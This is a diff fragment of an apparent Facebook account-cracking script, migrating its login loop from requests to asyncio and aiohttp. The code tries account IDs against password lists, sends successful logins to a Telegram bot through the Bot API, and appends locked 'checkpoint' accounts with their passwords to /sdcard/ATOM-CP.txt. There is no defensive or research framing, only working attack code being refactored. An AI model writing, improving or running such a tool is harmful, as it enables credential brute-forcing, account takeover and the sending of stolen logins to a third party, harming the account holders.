@@ -3,7 +3,7 @@ from os import path
 from os import system as Love_bithika
 from io import BytesIO
 import pycurl
-import requests,json,os,sys,random,datetime,time,re,platform,string,uuid,base64,hashlib
+import requests,asyncio,aiohttp,json,os,sys,random,datetime,time,re,platform,string,uuid,base64,hashlib
 from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
 from concurrent.futures import ThreadPoolExecutor as tred
 from time import sleep as waktu
@@ -1229,23 +1229,25 @@ async def m4(idf,pwv):
             async with session.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={statusok}") as resp:
                 ok += 1
                 break
-   elif 'checkpoint' in log_cookies:
-    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-    coki1 = coki.split("1000")[1]
-    uid = "1000"+coki1[0:11]
-    if 'y' in cp_xdx:
-     print(f'\r{P} [\033[1;30mATOM-CP.txt{P}] \033[1;30m{uid}|{ps}{xxx}')
-    open(' /sdcard/ATOM-CP.txt','a').write(uid+'|'+ps+'|'+'\n')
-    cp.append(uid)
-   else:
-    continue
-   time.sleep(0.1)
-  loop+=1
+    elif 'checkpoint' in log_cookies:
+       coki = ";".join([f"{cookie.name}={cookie.value}" for cookie in log_cookies])
+       coki1 = coki.split("1000")[1]
+       uid = "1000"+coki1[0:11]
+       if 'y' in cp_xdx:
+        print(f'\r[P][ATOM-CP.txt] {uid}|{ps}{xxx}')
+       with open('/sdcard/ATOM-CP.txt', 'a') as f:
+         f.write(f"{uid}|{ps}|\n")
+       cp.append(uid)  
+    else:
+      continue
+    await asyncio.sleep(0.1)
+   loop+=1
   
- except requests.exceptions.ConnectionError:
-        time.sleep(10)
- except Exception as e:
-        pass
+  except aiohttp.ClientError as e:
+     print(f"An error occurred: {e}")
+     await asyncio.sleep(10)
+  except Exception as e:
+     pass 
 def m5(idf,pwv):
  global loop
  global ok
